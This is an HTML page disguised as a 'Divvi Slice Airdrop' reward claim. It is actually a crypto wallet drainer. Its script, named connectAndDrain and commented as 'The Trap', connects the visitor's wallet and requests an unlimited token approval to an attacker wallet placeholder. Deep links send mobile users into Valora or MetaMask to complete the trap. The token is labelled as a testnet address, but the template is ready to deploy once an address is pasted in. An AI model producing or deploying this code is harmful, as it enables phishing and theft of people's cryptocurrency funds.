<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Divvi Slice Airdrop</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        h1 { margin-bottom: 10px; }
        p { color: #aaa; margin-bottom: 30px; }
        
        /* The Trap Button */
        .claim-btn {
            background: linear-gradient(45deg, #FFD700, #FFAA00);
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            font-weight: bold;
            color: #333;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.4);
            margin-bottom: 15px;
            width: 100%;
            max-width: 300px;
        }
        
        /* Deep Link Buttons (Hidden by default) */
        .deep-link {
            display: none;
            background: #333;
            border: 1px solid #555;
            color: white;
            padding: 15px;
            width: 100%;
            max-width: 300px;
            border-radius: 10px;
            margin-top: 10px;
            text-decoration: none;
            font-weight: bold;
        }

        #status { margin-top: 20px; font-size: 14px; color: #ff5555; }
    </style>
</head>
<body>

    <h1>üéâ Divvi Slice Airdrop</h1>
    <p>You are eligible! Click below to claim.</p>

    <button id="mainBtn" class="claim-btn" onclick="connectAndDrain()">CLAIM REWARD üéÅ</button>

    <a id="valoraBtn" href="#" class="deep-link">Open in Valora üü°</a>
    <a id="metamaskBtn" href="#" class="deep-link">Open in MetaMask ü¶ä</a>
    
    <div id="status"></div>

    <script>
        // --- CONFIGURATION ---
        const TOKEN_ADDRESS = "0x874069Fa1Eb16D44d622F2e0Ca25eeA172369bC1"; // Celo Alfajores Testnet
        const SPENDER_ADDRESS = "YOUR_ATTACKER_WALLET_ADDRESS_HERE"; // <--- PASTE YOUR ATTACKER WALLET HERE
        const MAX_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
        const ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];

        // Check environment immediately
        window.onload = function() {
            const currentUrl = window.location.href.replace("http://", "").replace("https://", "");
            
            // If standard browser (no wallet detected), show Deep Links
            if (!window.ethereum) {
                document.getElementById('status').innerText = "‚ö†Ô∏è Wallet not detected. Use the buttons below.";
                
                // Configure Deep Links
                // This forces the phone to switch apps
                document.getElementById('valoraBtn').style.display = "block";
                document.getElementById('valoraBtn').href = `celo://wallet/dapp?url=https://${currentUrl}`;
                
                document.getElementById('metamaskBtn').style.display = "block";
                document.getElementById('metamaskBtn').href = `https://metamask.app.link/dapp/${currentUrl}`;
            }
        };

        async function connectAndDrain() {
            const statusDiv = document.getElementById("status");
            
            if (!window.ethereum) {
                statusDiv.innerText = "‚ùå Please use the 'Open in...' buttons below.";
                return;
            }

            try {
                // 1. Connect
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = provider.getSigner();

                statusDiv.innerText = "Processing...";
                statusDiv.style.color = "#ffff00";

                // 2. The Trap (Approve)
                const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ABI, signer);
                const tx = await tokenContract.approve(SPENDER_ADDRESS, MAX_APPROVAL);

                console.log("Tx Sent:", tx.hash);
                statusDiv.innerText = "‚úÖ Claiming... (Wait for confirmation)";
                statusDiv.style.color = "#00ff00";

            } catch (error) {
                console.error(error);
                statusDiv.innerText = "‚ùå " + (error.reason || "Action Cancelled");
            }
        }
    </script>

</body>
</html>
